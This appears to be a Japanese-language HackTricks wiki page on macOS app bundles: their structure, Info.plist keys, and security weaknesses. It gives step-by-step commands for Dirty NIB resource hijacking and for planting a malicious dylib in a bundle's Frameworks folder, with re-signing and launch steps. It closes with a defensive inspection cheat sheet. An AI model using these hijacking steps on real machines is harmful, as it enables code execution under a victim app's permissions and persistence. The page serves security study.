# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## 基本情報

macOSのBundlesは、アプリケーション、libraries、その他の必要なファイルなど、さまざまなリソースのcontainerとして機能します。これにより、Finderでは一般的な`*.app`ファイルのように、単一のオブジェクトとして表示されます。最もよく見かけるbundleは`.app` bundleですが、`.framework`、`.systemextension`、`.kext`などのタイプも一般的です。

### Bundleの主要コンポーネント

bundle内、特に`<application>.app/Contents/`ディレクトリには、さまざまな重要なリソースが格納されています。

- **\_CodeSignature**: このディレクトリには、アプリケーションのintegrityを検証するために重要なcode-signingの詳細が保存されています。次のようなcommandを使用してcode-signing情報を確認できます:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: ユーザー操作時に実行されるアプリケーションの executable binary を含みます。
- **Resources**: 画像、ドキュメント、interface descriptions（nib/xib files）など、アプリケーションの user interface components を格納します。
- **Info.plist**: アプリケーションの主要な configuration file として機能し、システムがアプリケーションを適切に認識・操作するために重要です。

#### Info.plist の重要な Key

`Info.plist` file はアプリケーション configuration の基盤であり、次のような key が含まれます。

- **CFBundleExecutable**: `Contents/MacOS` directory にある main executable file の名前を指定します。
- **CFBundleIdentifier**: アプリケーションの global identifier を提供します。macOS がアプリケーションを管理する際に広く使用します。
- **LSMinimumSystemVersion**: アプリケーションの実行に必要な macOS の minimum version を示します。

### Bundle の調査

`Safari.app` などの bundle の内容を調査するには、次の command を使用できます: `bash ls -lR /Applications/Safari.app/Contents`

この調査により、`_CodeSignature`、`MacOS`、`Resources` などの directory や、`Info.plist` などの file が確認できます。それぞれ、アプリケーションの security から user interface や operational parameters の定義まで、固有の役割を担います。

#### その他の Bundle Directory

一般的な directory 以外に、bundle には次のものが含まれる場合があります。

- **Frameworks**: アプリケーションが使用する bundled frameworks を含みます。Frameworks は追加の resources を持つ dylibs のようなものです。
- **PlugIns**: アプリケーションの capabilities を拡張する plug-ins と extensions 用の directory です。
- **XPCServices**: アプリケーションが out-of-process communication に使用する XPC services を格納します。

この構造により、必要なすべての components が bundle 内に encapsulate され、modular かつ secure な application environment が実現されます。

`Info.plist` keys とその意味についての詳細は、Apple developer documentation に豊富な resources があります: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).<sup>[[3]](#references)</sup>

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: quarantined bundle が初めて実行されると、macOS は deep signature verification を実行し、randomized translocated path から実行する場合があります。受け入れられた後の起動では shallow checks のみが実行されます。`Resources/`、`PlugIns/`、nibs などの resource files は、歴史的に check の対象外でした。macOS 13 Ventura 以降では、first run 時に deep check が強制され、新しい *App Management* TCC permission により、user consent なしで third-party processes が他の bundles を変更することが制限されます。ただし、古い systems は引き続き vulnerable です。
- **Bundle Identifier collisions**: 同じ `CFBundleIdentifier` を再利用する複数の embedded targets（PlugIns、helper tools）により、signature validation が壊れたり、URL-scheme hijacking/confusion が可能になったりする場合があります。常に sub-bundles を列挙し、unique IDs を verify してください。

## Resource Hijacking (Dirty NIB / NIB Injection)

Ventura より前は、signed app の UI resources を置き換えることで shallow code signing を bypass し、app の entitlements を使用した code execution を実現できました。現在の research（2024）では、これは pre-Ventura および un-quarantined builds でも引き続き機能します:<sup>[[1]](#references)[[2]](#references)</sup>

1. target app を writable location（例: `/tmp/Victim.app`）へ copy します。
2. `Contents/Resources/MainMenu.nib`（または `NSMainNibFile` で宣言された任意の nib）を、`NSAppleScript`、`NSTask` などを instantiate する malicious なものに replace します。
3. app を launch します。malicious な nib は victim の bundle ID と entitlements（TCC grants、microphone/camera など）の下で execute されます。
4. Ventura+ では first launch 時に bundle を deep-verify し、後続の modifications には *App Management* permission を要求することで mitigation します。そのため persistence はより困難ですが、古い macOS に対する initial-launch attacks は依然として適用されます。<sup>[[1]](#references)</sup>

Minimal malicious nib payload example（xib を `ibtool` で nib に compile）:
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Bundle 内での Framework / PlugIn / dylib Hijacking

`@rpath` の lookup では bundled Frameworks/PlugIns が優先されるため、`Contents/Frameworks/` または `Contents/PlugIns/` 内に malicious library を配置すると、main binary が library validation なし、または弱い `LC_RPATH` の順序で署名されている場合に load order を redirect できます。

unsigned/ad-hoc bundle を悪用する場合の一般的な手順:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
注意:
- `com.apple.security.cs.disable-library-validation` がない Hardened Runtime では、third-party dylibs がブロックされます。まず entitlements を確認してください。
- `Contents/XPCServices/` 配下の XPC services は sibling frameworks をロードすることが多く、永続化または privilege escalation の経路として、同様にそれらのバイナリを patch できます。

## 簡易インスペクションチートシート
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## 参考資料

- [1] [プロセスインジェクションを可視化する: nib files を使用して macOS apps を悪用する (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB と bundle resource tampering の write-up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
- [3] [Apple Developer - Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html)

{{#include ../../../banners/hacktricks-training.md}}
